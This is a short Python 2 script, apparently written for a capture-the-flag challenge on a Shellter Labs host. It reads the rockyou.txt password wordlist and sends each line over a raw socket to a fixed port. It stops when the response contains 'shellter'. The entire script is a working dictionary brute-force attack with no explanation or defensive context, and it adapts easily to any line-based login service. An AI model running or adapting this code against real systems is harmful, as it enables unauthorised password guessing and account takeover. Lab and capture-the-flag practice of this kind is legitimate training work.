import socket


ip ='lab.shellterlabs.com'
port = 34246

arq = open('rockyou.txt','r')
linhas = arq.readlines()
s=socket.socket()
s.connect((ip, port))
for linha in linhas:
        s.send(str(linha))
        resposta = s.recv(1024)
        print ("tentando a senha :",str(linha))
        if "shellter"in resposta:
                break

print resposta

